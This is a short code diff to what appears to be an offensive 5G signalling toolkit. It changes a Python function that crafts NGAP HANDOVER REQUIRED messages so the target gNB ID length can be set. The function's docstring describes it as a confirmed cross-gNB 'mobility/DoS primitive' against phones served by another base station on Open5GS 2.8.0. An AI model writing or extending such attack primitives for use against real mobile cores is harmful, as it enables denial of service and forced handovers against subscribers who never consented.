@@ -439,6 +439,7 @@ def _global_gnb_id(cfg: dict, gnb_id: int, gnb_id_len: int = 32):
 
 def handover_required(amf_ue_id: int, ran_ue_id: int, cfg: dict, *,
                       target_gnb_id: int, pdu_sessions=(1,),
+                      target_gnb_id_len: int | None = None,
                       cause=("radioNetwork", "handover-desirable-for-radio-reason"),
                       src2tgt_container: bytes = b"\x00"):
     """HANDOVER REQUIRED (Class 1). Open5GS 2.8.0: CONFIRMED cross-gNB.
@@ -449,8 +450,9 @@ def handover_required(amf_ue_id: int, ran_ue_id: int, cfg: dict, *,
     mobility/DoS primitive against a UE served by another gNB.
     """
     tac = int(cfg["tac"]).to_bytes(3, "big")
+    tgt_len = int(target_gnb_id_len if target_gnb_id_len is not None else 32)
     target = ("targetRANNodeID", {
-        "globalRANNodeID": _global_gnb_id(cfg, target_gnb_id),
+        "globalRANNodeID": _global_gnb_id(cfg, target_gnb_id, gnb_id_len=tgt_len),
         "selectedTAI": {"pLMNIdentity": encode_plmn(cfg["mcc"], cfg["mnc"]),
                         "tAC": tac},
     })
